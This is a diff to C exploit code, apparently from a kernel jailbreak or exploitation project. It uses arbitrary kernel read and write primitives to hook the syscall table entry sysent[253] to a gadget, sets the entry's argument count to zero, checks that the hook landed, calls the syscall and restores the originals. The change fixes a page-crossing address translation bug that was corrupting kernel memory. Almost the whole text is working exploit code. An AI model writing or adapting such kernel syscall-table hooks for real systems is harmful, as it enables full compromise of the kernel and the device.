@@ -5569,26 +5569,52 @@ static void campaign_flatz_setup(void) {
                  */
                 printf("\n[*] Test 4a: Direct sysent call to minimal gadget...\n");
                 {
-                    /* Read current sysent[253] */
-                    uint64_t sysent_kva = g_kdata_base + 0x1709c0;
-                    uint64_t sysent_pa = va_to_pa_quiet(sysent_kva);
-                    if (sysent_pa) {
-                        /* sysent[253] is at offset 253*16+8 (sy_call field) */
-                        uint64_t entry_pa = sysent_pa + 253 * 16 + 8;
-                        uint64_t orig_syscall = 0;
-                        kernel_copyout(g_dmap_base + entry_pa, &orig_syscall, 8);
+                    /*
+                     * Hook sysent[253].sy_call → minimal gadget.
+                     *
+                     * IMPORTANT: Must translate the *entry* VA to PA, not add
+                     * the entry offset to sysent base PA.  Sysent[0] is at
+                     * page offset 0x9c0, so entry 253 (at +0xFD0) crosses
+                     * into the next page — which has a different PA.
+                     * The old code (sysent_pa + 253*16+8) pointed to wrong
+                     * physical memory, corrupting kernel state (EFAULT).
+                     */
+                    uint64_t sysent_kva = g_kdata_base + 0x1709c0ULL;
+                    uint64_t s253_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
+                    uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
+                    uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
+                    if (s253_call_pa && s253_narg_pa) {
+                        /* Save original sy_call */
+                        uint64_t orig_call = 0;
+                        kernel_copyout(g_dmap_base + s253_call_pa, &orig_call, 8);
+                        /* Save original narg and set to 0 (no arg copyin) */
+                        int32_t orig_narg = 0;
+                        kernel_copyout(g_dmap_base + s253_narg_pa, &orig_narg, 4);
+                        int32_t zero_narg = 0;
+                        kernel_copyin(&zero_narg, g_dmap_base + s253_narg_pa, 4);
 
-                        /* Hook sysent[253] → minimal gadget */
+                        printf("    sysent[253] original: sy_call=0x%lx, narg=%d\n",
+                               (unsigned long)orig_call, orig_narg);
+
+                        /* Hook sysent[253].sy_call → minimal gadget */
                         kernel_copyin(&g_minimal_xapic_gadget,
-                                      g_dmap_base + entry_pa, 8);
+                                      g_dmap_base + s253_call_pa, 8);
+
+                        /* Verify hook landed */
+                        uint64_t hook_rb = 0;
+                        kernel_copyout(g_dmap_base + s253_call_pa, &hook_rb, 8);
+                        printf("    sysent[253].sy_call = 0x%lx [%s]\n",
+                               (unsigned long)hook_rb,
+                               hook_rb == g_minimal_xapic_gadget ? "HOOKED" : "MISMATCH");
 
                         /* Call it */
+                        errno = 0;
                         long ret = syscall(253);
                         int err = errno;
 
                         /* Restore immediately */
-                        kernel_copyin(&orig_syscall,
-                                      g_dmap_base + entry_pa, 8);
+                        kernel_copyin(&orig_call, g_dmap_base + s253_call_pa, 8);
+                        kernel_copyin(&orig_narg, g_dmap_base + s253_narg_pa, 4);
 
                         printf("    syscall(253) = %ld, errno=%d\n", ret, err);
                         if (ret == 1 && err == 0) {
@@ -5598,10 +5624,11 @@ static void campaign_flatz_setup(void) {
                             printf("[+] Test 4a PASSED — gadget returns 1 (errno=%d ok)\n", err);
                             gadget_test_passed = 1;
                         } else {
-                            printf("[-] Test 4a: unexpected return value %ld\n", ret);
+                            printf("[-] Test 4a: unexpected return value %ld (errno=%d)\n",
+                                   ret, err);
                         }
                     } else {
-                        printf("[-] sysent VA→PA failed.\n");
+                        printf("[-] sysent[253] VA→PA failed.\n");
                     }
                 }
 
